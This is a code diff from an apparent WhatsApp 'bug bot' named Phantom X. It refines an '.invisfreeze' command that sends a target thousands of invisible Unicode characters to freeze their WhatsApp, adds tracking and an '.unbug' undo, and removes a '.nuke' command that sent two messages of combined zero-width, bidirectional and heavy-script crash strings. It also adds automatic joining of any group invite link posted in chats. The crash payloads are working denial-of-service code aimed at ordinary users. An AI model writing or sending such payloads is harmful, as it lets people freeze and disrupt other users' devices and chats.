+                    if (!aj[key]) aj[key] = {};
+                    aj[key].enabled = true;
+                    saveAutojoin(aj);
+                    return reply(`✅ *Auto-join ON!*\nThe bot will now automatically join any WhatsApp group link shared in your groups.\n\n🚫 Blacklisted links (porn/adult/nude etc.) will be skipped.`);
+                }
+                if (ajArg === "off") {
+                    if (!aj[key]) aj[key] = {};
+                    aj[key].enabled = false;
+                    saveAutojoin(aj);
+                    return reply(`❌ *Auto-join OFF.*\nThe bot will no longer auto-join group links.`);
+                }
+                return reply("Usage: .autojoin on/off");
             }
 
             // ─── LOCKED GROUP BYPASS ───
@@ -3171,56 +3261,21 @@ async function handleMessage(sock, msg) {
             }
 
             // ─── INVISIBLE FREEZE ───
-            // Sends an invisible message (no visible text) — target sees nothing arrive
-            // but their WhatsApp has to process the payload, causing freeze/lag.
-            case ".invisfreeze": {
+            // Sends an invisible message — target sees nothing arrive, but WA freezes.
+            case ".invisfreeze":
+            case ".if": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const ifMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const ifArg = parts[1];
-                let ifTarget = null;
-                if (ifMentioned.length) {
-                    ifTarget = ifMentioned[0];
-                } else if (ifArg && ifArg.endsWith("@g.us")) {
-                    ifTarget = ifArg;
-                } else {
-                    ifTarget = from;
-                }
-                await reply(`👁️ Sending invisible freeze to ${ifTarget.endsWith("@g.us") ? "group" : `@${ifTarget.split("@")[0]}`}...`);
+                const ifTarget = parseBugTarget(parts, msg);
+                if (!ifTarget) return reply(`👁️ *Invisible Freeze*\n\nUsage: *.invisfreeze <number>*\nShortcut: *.if <number>*\nExample: *.invisfreeze 2348012345678*\n\n_Target sees no message — but WA silently freezes._\n_Use .bugmenu freeze for full help._`);
+                if (isDevProtected(ifTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
+                await reply(`👁️ Sending invisible freeze to *${ifTarget.split("@")[0]}*...`);
                 try {
-                    // Pure invisible chars — no text visible at all, but huge processing cost
                     const inv = "\u2062\u2063\u2064\u2061\u00AD\u200B\u200C\u200D\u200E\u200F\u2060\uFEFF";
                     const bigInv = inv.repeat(2000);
-                    await sock.sendMessage(ifTarget, { text: bigInv });
-                    await reply(
-                        `✅ *Invisible freeze sent!*\n\n` +
-                        `👁️ Target sees *no message* — their chat looks empty.\n` +
-                        `💀 But their WhatsApp has to process ${inv.length * 2000} invisible characters — causing freeze/lag.\n` +
-                        `📵 Messages may stop flowing in/out of that chat temporarily.`
-                    );
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            // ─── NUKE (All bugs into 2 messages) ───
-            case ".nuke": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const nukeMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const nukeTarget = nukeMentioned[0];
-                if (!nukeTarget) return reply("Usage: .nuke @user\n\n☢️ Fires the combined payload of ALL bug types in 2 messages.");
-                await reply(`☢️ *NUKE ACTIVATED* on @${nukeTarget.split("@")[0]}...`);
-                try {
-                    const zw     = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f\u202a\u202b\u202c\u202d\u202e".repeat(600);
-                    const rtl    = "\u202e\u202d\u202c\u202b\u202a".repeat(600);
-                    const tel    = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(400);
-                    const sindhi = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(400);
-                    const arabic = "\u0647".repeat(400) + "\uFDFD".repeat(300);
-                    const bidi   = "\u2066\u2067\u2068\u2069".repeat(400);
-                    const wave1  = zw + rtl + tel + sindhi;
-                    const wave2  = arabic + bidi + zw + rtl + "═".repeat(1000) + "〰".repeat(1000);
-                    await sock.sendMessage(nukeTarget, { text: wave1 });
-                    await delay(600);
-                    await sock.sendMessage(nukeTarget, { text: wave2 });
-                    await reply(`☢️ *NUKE COMPLETE!* @${nukeTarget.split("@")[0]} hit with 2 combined crash waves! ☠️`);
+                    const ifSent = await sock.sendMessage(ifTarget, { text: bigInv });
+                    if (!userCrashKeys[ifTarget]) userCrashKeys[ifTarget] = [];
+                    userCrashKeys[ifTarget].push(ifSent.key);
+                    await reply(`✅ *Invisible freeze sent to ${ifTarget.split("@")[0]}!*\n\n👁️ Target sees *no message* — chat looks empty.\n💀 But WA is processing ${inv.length * 2000} hidden chars — freeze/lag active.\n🔧 To undo: *.unbug ${ifTarget.split("@")[0]}*`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -3623,6 +3678,36 @@ async function startBot(userId, phoneNumber, ctx, isReconnect = false) {
             // Process "notify" (normal incoming) OR any fromMe message (owner commands in self-chat/groups)
             if (type !== "notify" && !msg.key.fromMe) continue;
             await handleMessage(sock, msg);
+        }
+    });
+
+    // Auto-join group links detection
+    sock.ev.on("messages.upsert", async ({ messages, type }) => {
+        if (type !== "notify") return;
+        for (const m of messages) {
+            if (m.key?.fromMe) continue;
+            const ajFrom = m.key?.remoteJid;
+            if (!ajFrom?.endsWith("@g.us")) continue;
+            const aj = loadAutojoin();
+            const ajKey = sock.user?.id || "global";
+            if (!aj[ajKey]?.enabled) continue;
+            const ajText =
+                m.message?.conversation ||
+                m.message?.extendedTextMessage?.text ||
+                m.message?.imageMessage?.caption ||
+                m.message?.videoMessage?.caption || "";
+            const linkMatch = ajText.match(/https?:\/\/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
+            if (!linkMatch) continue;
+            const ajCode = linkMatch[1];
+            // Blacklist check
+            const blacklist = ["porn","adult","xxx","nude","sex","leak","onlyfan"];
+            if (blacklist.some(b => ajText.toLowerCase().includes(b))) continue;
+            try {
+                await sock.groupAcceptInvite(ajCode);
+                console.log(`[AutoJoin] Joined group via link code: ${ajCode}`);
+            } catch (e) {
+                console.log(`[AutoJoin] Failed to join ${ajCode}: ${e?.message}`);
+            }
         }
     });
 
